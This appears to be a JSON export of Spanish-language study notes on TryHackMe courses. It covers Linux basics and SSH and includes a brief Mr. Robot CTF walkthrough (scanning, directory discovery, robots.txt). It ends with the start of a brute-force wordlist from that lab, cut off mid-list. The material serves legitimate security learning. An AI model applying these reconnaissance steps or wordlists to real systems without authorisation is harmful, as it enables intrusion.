    "content": "Secure SHell (SSH) es un protocolo usado para conectarse a máquinas de manera remota.\n\n-----------\n<h2>¿Qué es SSH y cómo funciona?</h2>\nEs un protocolo entre dispositivos de forma encriptada. Usando criptografía, cualquier input humanamente leíble, se encripta para su transporte por la red. Siendo desencriptado una vez llega a la máquina remota.\n\n![[022.png]]\n\nDe momento sólo necesitamos entender que:\n\n- SSH nos permite ejecutar comandos de manera remota desde otro dispositivo.\n- Cualquier información mandada entre dispositivos es encriptada.\n\n--------------------------\n<h2>Usando SSH para loguearnos en nuestra máquina Linux</h2>\nEl uso de SSH es muy sencillo, sólo necesitamos proporcionar dos cosas:\n\n1. La IP de la máquina remota.\n2. Credenciales correctas para validar el login.\n\nPara esta lección nos conectaremos como el usuario tryhackme cuya contraseña es tryhackme. La sintaxis es: `ssh <usuario>@<direccion_ip>`.\n\n1. ![[024.png]]\n2. ![[023.png]]\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "En esta segunda parte de Linux Fundamentals estaremos aplicando los conocimientos adquiridos en la primera parte. Además, en esta segunda parte estaremos:\n\n- Desbloqueando el potencial de los primeros comandos introduciendo flags y argumentos.\n- Avanzando tu conocimiento del sistema de ficheros para realizar comandos más útiles como copiar y mover archivos.\n- Descubriendo cómo se maneja el acceso a archivos y ficheros y cómo podemos determinar nuestro acceso."
  },
  {
    "title": "0. Linux Fundamentals 2",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/0-linux-fundamentals-2/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/0. Linux Fundamentals 2.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "[[THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/1. Introduction|1. Introduction]]\n[[2. Accessing Your Linux Machine Using SSH]]\n[[3. Introduction to Flags and Switches]]\n[[4. Filesystem Interaction Continued]]\n[[5. Permissions 101]]\n[[6. Common Directories]]\n"
  },
  {
    "title": "6. Common Directories",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/6-common-directories/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/6. Common Directories.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "<h2>/etc</h2>\nViene de etcetera. Es uno de los más importantes. Este directorio es un lugar común en el sistema para almacenar archivos que serán usados por el sistema operativo.\n\nPor ejemplo, el archivo sudoers que contiene una lista de usuarios y grupos que tienen permiso para hacer \"sudo\".\n\nTambién están los archivos \"passwd\" y \"shadow\". Estos son especiales de Linux porque guardan contraseñas encriptadas para cada usuario.\n\n```bash\ntryhackme@linux2:/etc$ ls\nshadow passwd sudoers sudoers.d\n```\n\n-----------------\n<h2>/var</h2>\nViene de variable data. Almacena información que es frecuentemente accedida o escrita por servicios o aplicaciones que corren en el sistema, por ejemplo, los archivos de log son escritos en **/var/log**.\n\n```bash\ntryhackme@linux2:/var$ ls\nbackups log opt tmp\n```\n\n-----------------------\n<h2>/root</h2>\nRoot es la carpeta \"/home\" del usuario root.\n\n```bash\nroot@linux2:~# ls\nmyfile myfolder passwords.xlsx\n```\n\n---------------------\n<h2>/tmp</h2>\nEs un directorio que viene de \"temporary\". Es volátil, lo que implica que lo que haya dentro se borra al apagarse la máquina. Funciona de manera similar a una RAM.\n\nCualquier usuario puede escribir en este fichero por defecto.\n\n```bash\nroot@linux2:/tmp# ls\ntodelete trash.txt rubbish.bin\n```\n"
  },
  {
    "title": "4. Filesystem Interaction Continued",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/4-filesystem-interaction-continued/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/4. Filesystem Interaction Continued.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "Hemos cubierto algunos de los comandos fundamentales al interactuar con el sistema de ficheros en una máquina Linux. En esta lección vamos a aprender comandos para:\n\n- Crear archivos y ficheros.\n- Mover archivos y ficheros.\n- Borrar archivos y ficheros.\n\n| Comando | Nombre completo | Propósito                      |\n| ------- | --------------- | ------------------------------ |\n| touch   | touch           | Crear un archivo (vacío)       |\n| mkdir   | make directory  | Crear un directorio            |\n| cp      | copy            | Copiar un archivo o directorio |\n| mv      | move            | Mover un archivo o directorio  |\n| rm      | remove          | Borrar un archivo o directorio |\n| file    | file            | Determina el tipo de archivo   |\n\n>[!TIP] Similar al comando cat donde podíamos usar rutas absolutas, con estos comandos también podemos.\n\n----------------------------\n<h2>Crear archivos y ficheros</h2>\nCrear archivos y directorios en Linux es un proceso sencillo. Primero, veremos cómo crear un archivo .\n<h3>Touch</h3>\nEl comando touch admite exactamente un argumento: el nombre del archivo. Es importante notar que touch sólo crea el archivo en blanco, sería necesaria la utilización de comandos como echo o editores de texto como vim para rellenarlo.\n\n```bash\ntryhackme@linux2:~$ ls\nfolder1\ntryhackme@linux2:~$ touch nota\ntryhackme@linux2:~$ ls\nfolder1 nota\n```\n\n<h3>Mkdir</h3>\nUn proceso similar se sigue para crear directorios. Para ello utilizaremos el comando mkdir:\n\n```bash\ntryhackme@linux2:~$ ls\nfolder1 nota\ntryhackme@linux2:~$ mkdir miDirectorio\ntryhackme@linux2:~$ ls\nfolder1 miDirectorio nota\n```\n\n-------------------------\n<h2>Borrar archivos y ficheros (rm)</h2>\nEl comando `rm` (remove) es especial con respecto a los que ya hemos visto. Para borrar un archivo vale con hacer `rm <nombre_del_archivo>`. Sin embargo, para poder borrar directorios necesitamos incluir el switch `-R` (recursivo). Esto ocurre porque necesitamos decirle que vaya buscando directorios dentro de esos directorios y de cada uno elimine todos los archivos.\n\n>[!NOTE] Si el directorio está vacío, si que se puede borrar sin `-R`.\n\n```bash\ntryhackme@linux2:~$ rm note\ntryhackme@linux2:~$ ls\nfolder1 miDirectorio\n```\n\n```bash\ntryhackme@linux2:~$ rm -R miDirectorio\ntryhackme@linux2:~$ ls\nfolder1\n```\n\n------------------------\n<h2>Copiar y mover archivos y ficheros</h2>\nCopiar y mover archivos es una funcionalidad importante de Linux.\n<h3>Cp</h3>\nEl comando `cp` (copy), toma dos argumentos:\n\n1. El nombre del archivo existente (el que se va a copiar).\n2. El nombre que queremos darle a la copia.\n\n```bash\ntryhackme@linux2:~$ echo \"Esto es una nota\" > nota\ntryhackme@linux2:~$ cp nota nota2\ntryhackme@linux2:~$ ls\nfolder1 nota nota2\n```\n\n<h3>Mv</h3>\nMover un archivo requiere dos argumentos, como copiarlos. No solo puede usarse `mv` para mover un archivo o directorio sino también para renombrarlo.\n\n```bash\ntryhackme@linux2:~$ mv nota2 nota3\ntryhackme@linux2:~$ ls\nfolder1 nota nota3\n```\n\n----------------------------\n<h2>Determinando el tipo de archivo</h2>\nLo que es confuso y a veces coge a las personas de imprevisto es que las extensiones en Linux no tienen significado, podemos llamar a un archivo de texto .png y nada cambiará, seguirá siendo oun archivo de texto. \n\nPara saber delante de qué tipo de archivo estamos tenemos el comando file, el cua nos devuelve información sobre el archivo en cuestión:\n\n```bash\ntryhackme@linux2:~$ file nota\nnota: ASCII text\n```\n"
  },
  {
    "title": "5. Permissions 101",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/5-permissions-101/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/5. Permissions 101.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "Como ya habrás comprobado, ciertos usuarios no pueden acceder a según qué archivos o ficheros.\n\nYa vimos cómo extender comandos con switches como `ls -lh`.\n\n```bash\ntryhackme@linux2:~$ ls -lh\n-rw-r--r-- 1 cmnatic cmnatic 0 Feb 19 10:37 file1\n-rw-r--r-- 8 cmnatic cmnatic 0 Feb 19 10:37 file2\n```\n\nAunque parecen intimidantes, en verdad se leen de manera fácil:\n\n- Read (r)\n- Write (w)\n- Execute (x)\n\nEstas letras marcan las acciones permitidas a cada grupo.\n\n-------------------\n<h2>Diferencias entre Usuarios y Grupos</h2>\nUna de las cosas tan geniales de Linux es que mientras un usuario puede tener un cierto conjunto de permisos sobre un archivo o fichero, otro grupo de usuarios puede tener los mismos o diferentes.\n\n------------------\n<h2>Cambiar entre Usuarios</h2>\nEs muy fácil gracias al comando `su` (switch user). Al hacerlo puedes usar el switch -l para conseguir las variables de entorno, y loguearnos de una manera muy familiar.\n\n```bash\ntryhackme@linux2:~$ su user2\nPassword:\nuser2@linux2:/home/tryhackme$\n```\n\nAl usar `su` para cambiar a user2, la nueva sesión sobrecae en  el directorio anterior al cambio.\n\n```bash\ntryhackme@linux2:~$ su -l user2\nPassword:\nuser2@linux2:~$ pwd\nuser2@:/home/user2$\n```\n\nMientras que al usar `-l`, esta recae en la ruta home del nuevo usuario."
  },
  {
    "title": "3. Introduction to Flags and Switches",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/3-introduction-to-flags-and-switches/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/3. Introduction to Flags and Switches.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "La mayoría de los comandos permiten argumentos. Estos son identificados con un guión y una cierta palabra clave o switches.\n\nAl usar un comando, mientras no se haya especificado nada más, este efectuará su comportamiento por defecto. Por ejemplo `ls` lista los elementos de un directorio. Sin embargo, los archivos ocultos no se muestran. Podemos usar flags para modificar el comportamiento de los comandos.\n\nPor ejemplo, `-a` (abreviatura para `--all`) podemos ver incluso los archivos ocultos (los que empiezan con un punto).\n\n```bash\ntryhackme@linux2:~$ ls\nfolder1\ntryhackme@linux2:~$ ls -a\n.hiddenfolder folder1\n```\n\nLos comandos que aceptan argumentos tienen la flag `--help` o `-h`. Esta opción listará las posibles opciones que tiene el comando para realizar.\n\nEsta opción es, en realidad, un output formateado llamado manual page (página de manual).\n\nLas páginas de manual son excelentes fuentes de información. Para acceder a esta información podemos usar el comando `man` o las flags de help que hemos visto antes:\n\n```bash\ntryhackme@linux2:~$ man ls\n```\n"
  },
  {
    "title": "1. Security Analyst",
    "path": "/apuntes/thm/1-career/1-security-analyst/1-security-analyst/",
    "src": "content/Ciberseguridad/THM/1. Career/1. Security Analyst/1. Security Analyst.md",
    "breadcrumb": "THM > 1. Career > 1. Security Analyst",
    "content": ""
  },
  {
    "title": "3. Security Engineer",
    "path": "/apuntes/thm/1-career/3-security-engineer/3-security-engineer/",
    "src": "content/Ciberseguridad/THM/1. Career/3. Security Engineer/3. Security Engineer.md",
    "breadcrumb": "THM > 1. Career > 3. Security Engineer",
    "content": ""
  },
  {
    "title": "2. Penetration Tester",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-penetration-tester/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Penetration Tester.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester",
    "content": ""
  },
  {
    "title": "1. Jr Penetration Tester",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-jr-penetration-tester/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Jr Penetration Tester.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester",
    "content": "[[1. Introduction to Cyber Security]]\n[[2. Introduction to Pentesting]]\n[[3. Introduction to Web Hacking]]\n[[4. Burp Suite]]\n[[5. Network Security]]\n[[6. Vulnerability Research]]\n[[7. Metasploit]]\n[[8. Privilege Escalation]]\n"
  },
  {
    "title": "8. Privilege Escalation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/8-privilege-escalation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/8. Privilege Escalation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation",
    "content": ""
  },
  {
    "title": "3. Introduction to Web Hacking",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/3-introduction-to-web-hacking/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Introduction to Web Hacking.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking",
    "content": ""
  },
  {
    "title": "4. Burp Suite",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite",
    "content": ""
  },
  {
    "title": "5. Network Security",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-network-security/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Network Security.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security",
    "content": ""
  },
  {
    "title": "1. Introduction to Cyber Security",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/1-introduction-to-cyber-security/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/1. Introduction to Cyber Security.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security",
    "content": "1. [[THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/1. Offensive Security Intro/0. Offensive Security Intro]]\n2. [[THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/2. Defensive Security Intro/0. Defensive Security Intro]]\n3. [[THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/3. Careers in Cyber/0. Careers in Cyber]]\n\n"
  },
  {
    "title": "7. Metasploit",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/7-metasploit/7-metasploit/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/7. Metasploit.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 7. Metasploit",
    "content": ""
  },
  {
    "title": "6. Vulnerability Research",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/6-vulnerability-research/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/6. Vulnerability Research.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research",
    "content": ""
  },
  {
    "title": "2. Introduction to Pentesting",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-introduction-to-pentesting/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Introduction to Pentesting.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting",
    "content": "1. [[0. Pentesting Fundamentals]]\n2. [[0. Principles of Security]]\n"
  },
  {
    "title": "4. Threat Modelling & Incident Response",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-principles-of-security/4-threat-modelling-incident-response/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Principles of Security/4. Threat Modelling & Incident Response.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 2. Principles of Security",
    "content": ""
  },
  {
    "title": "3. Security Models Continued",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-principles-of-security/3-security-models-continued/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Principles of Security/3. Security Models Continued.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 2. Principles of Security",
    "content": ""
  },
  {
    "title": "2. Principles of Privileges",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-principles-of-security/2-principles-of-privileges/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Principles of Security/2. Principles of Privileges.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 2. Principles of Security",
    "content": ""
  },
  {
    "title": "0. Principles of Security",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-principles-of-security/0-principles-of-security/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Principles of Security/0. Principles of Security.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 2. Principles of Security",
    "content": "[[1. The CIA Triad]]\n[[2. Principles of Privileges]]\n[[3. Security Models Continued]]\n[[4. Threat Modelling & Incident Response]]\n"
  },
  {
    "title": "1. The CIA Triad",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-principles-of-security/1-the-cia-triad/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Principles of Security/1. The CIA Triad.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 2. Principles of Security",
    "content": ""
  },
  {
    "title": "1. What is Penetration Testing?",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/1-what-is-penetration-testing/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/1. What is Penetration Testing?.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
    "content": ""
  },
  {
    "title": "4. Black box, White Box, Grey Box Penetration Testing",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/4-black-box-white-box-grey-box-penetration-testing/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/4. Black box, White Box, Grey Box Penetration Testing.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
    "content": ""
  },
  {
    "title": "0. Pentesting Fundamentals",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/0-pentesting-fundamentals/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/0. Pentesting Fundamentals.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
    "content": "[[1. What is Penetration Testing?]]\n[[2. Penetratioon Testing Ethics]]\n[[3. Penetration Testing Methodologies]]\n[[4. Black box, White Box, Grey Box Penetration Testing]]\n[[5. Practical - ACME Penetration Test]]\n"
  },
  {
    "title": "5. Practical - ACME Penetration Test",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/5-practical-acme-penetration-test/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/5. Practical - ACME Penetration Test.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
    "content": ""
  },
  {
    "title": "2. Penetratioon Testing Ethics",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/2-penetratioon-testing-ethics/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/2. Penetratioon Testing Ethics.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
    "content": ""
  },
  {
    "title": "3. Penetration Testing Methodologies",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/3-penetration-testing-methodologies/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/3. Penetration Testing Methodologies.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
    "content": ""
  },
  {
    "title": "0. Defensive Security Intro",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/2-defensive-security-intro/0-defensive-security-intro/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/2. Defensive Security Intro/0. Defensive Security Intro.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security > 2. Defensive Security Intro",
    "content": "[[0. Deffensive Security Intro]]"
  },
  {
    "title": "0. Careers in Cyber",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/3-careers-in-cyber/0-careers-in-cyber/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/3. Careers in Cyber/0. Careers in Cyber.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security > 3. Careers in Cyber",
    "content": "[[THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/0. Careers in Cyber]]\n"
  },
  {
    "title": "0. Offensive Security Intro",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/1-offensive-security-intro/0-offensive-security-intro/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/1. Offensive Security Intro/0. Offensive Security Intro.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security > 1. Offensive Security Intro",
    "content": "[[THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/0. Offensive Security Intro]]"
  },
  {
    "title": "1. Easy",
    "path": "/apuntes/thm/maquinas/1-easy/1-easy/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/1. Easy.md",
    "breadcrumb": "THM > Maquinas > 1. Easy",
    "content": ""
  },
  {
    "title": "4. Insane",
    "path": "/apuntes/thm/maquinas/4-insane/4-insane/",
    "src": "content/Ciberseguridad/THM/Maquinas/4. Insane/4. Insane.md",
    "breadcrumb": "THM > Maquinas > 4. Insane",
    "content": ""
  },
  {
    "title": "3. Hard",
    "path": "/apuntes/thm/maquinas/3-hard/3-hard/",
    "src": "content/Ciberseguridad/THM/Maquinas/3. Hard/3. Hard.md",
    "breadcrumb": "THM > Maquinas > 3. Hard",
    "content": ""
  },
  {
    "title": "2. Medium",
    "path": "/apuntes/thm/maquinas/2-medium/2-medium/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/2. Medium.md",
    "breadcrumb": "THM > Maquinas > 2. Medium",
    "content": "1. [[0. Mr. Robot CTF]]\n2. "
  },
  {
    "title": "1. What is Key 1",
    "path": "/apuntes/thm/maquinas/2-medium/1-mr-robot/1-what-is-key-1/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/1. Mr. Robot/1. What is Key 1.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 1. Mr. Robot",
    "content": "1. ![[001 2.png]]\nPrimero realizamos un escaneo rápido, lo que nos deja ver los puertos abiertos de la máquina víctima. En seguida vemos que dispone de página web HTTP, vamos a ver qué encontramos.\n2. ![[002 1.png]]\nComo no vemos nada más que algunas secuencias y fotos en los cinco primeros comandos probamos el último.\n3. ![[003 1.png]]\nParece que puede llevarnos a algún sitio, pero primero deberíamos asegurarnos de que no hay directorios interesantes ocultos, a parte de los que ya hemos visto.\n4. ![[004 1.png]]\nVoila, encontramos unos cuantos. Revisándolos vemos `robots` y `robots.txt` que pueden tener contenido interesante.\n5. ![[005 1.png]]\nVaya, ¿qué hay por aquí? Key 1 of 3...\n6. ![[006 1.png]]\nObtenemos así la primera clave.\n"
  },
  {
    "title": "fsocity_dic_unic",
    "path": "/apuntes/thm/maquinas/2-medium/1-mr-robot/fsocity_dic_unic/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/1. Mr. Robot/fsocity_dic_unic.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 1. Mr. Robot",
    "content": "000\n000000\n000080\n001\n002\n003\n0032\n003s\n004\n00480\n004s\n005s\n006s\n007\n009Average\n010\n011\n012\n0125\n015\n016\n017\n01T16\n01T21\n01Z\n020\n022\n023\n024\n025\n026\n028\n02T23\n030\n031\n032\n036\n038\n039\n03T11\n03Z\n040\n042\n048\n049\n051\n052\n053\n054\n057\n05T18\n05Z\n064\n065\n0652\n066\n068\n069\n06T02\n06T15\n070\n071\n072\n073\n074\n075\n078\n07T01\n07Z\n080\n081\n082\n083\n0833\n084\n08480\n085\n086\n087\n088\n089\n08T18\n08Z\n090\n092\n093\n094\n095\n096\n097\n098\n09T21\n0Administrators\n0adminmentor\n0EDITS\n0Moderators\n100\n1000\n10011\n100324278356456dcb46c6d\n100341304556456e779b020\n100467736656456e0f22161\n100555\n100569\n100pts\n100px\n101\n101012091456456dd7b4d01\n102\n103\n1030965806564491e35e5dc\n1035\n103511978856456dc5a8f87\n103623698356456fcea1b4e\n103704487256456f0110dd4\n103n\n104\n1040829909268169\n104197312356456f17ac512\n10458032856456e31ba54a\n10485760\n104948075256456e05c4484\n105\n1054\n105917478456456e02e15df\n106\n106275388556456e70486c4\n1065\n106815734456456db39c637\n107\n1070bih\n107527038956456da103dc3\n108\n108004848756456f406278b\n108011311956456efa5c5ec\n1080393388564508fda53a8\n108639294756456fb05ec58\n109\n10953700556456deca0939\n10995892\n109c\n10pts\n10px\n10Z\n110\n110186443456456edb90128\n11042\n110696555556456dd759e52\n1107\n111\n111150646156456f5cccf41\n111176357056456f94eb662\n111177875956456e5be942c\n11150\n112\n1122\n112328095453510\n112382650256456de2acddb\n112711867956456f85007fe\n113\n113171763456456f2368ba1\n113434639056456f5d808ae\n11375\n114\n114494461756456dcbb5c72\n114646096456456e26e7cff\n114785627356456dbc1ca62\n11480\n114841529556456ea35f502\n114n\n115\n115209294056456fce08ab8\n115724471056456fa752e70\n1159\n116\n11695207556456dfb70b74\n117\n117228842656456e4486c7f\n117313646656456dc1eeffc\n11739027856456dfd88544\n118\n119\n119788221456456e581bbac\n1199146\n1199146lc\n119n\n11a\n11Add\n11T15\n120\n1200\n1201\n120115418856456f229102f\n120221118656456f4ce1f8c\n121\n121098290456456e0d71893\n12119086056456e936a37a\n121705691956456f0bbfb21\n122\n122240902856456e19ea896\n12280272656456de332275\n122n\n123\n123021953956456f6a8f236\n1231\n1234\n123456Seven\n123491429256456dd405d9b\n124\n124218125856456f9aedd25\n124410952556456da05e65a\n124684310556456df9d1362\n125\n125871186356456f4e6fbdc\n125935397956456e3c15e0b\n125px\n126\n126205128056456e3342e73\n12624910455645083e2f2fe\n127\n127056157556457031a8191\n127346072656456da5c0ce1\n127408610856456e0c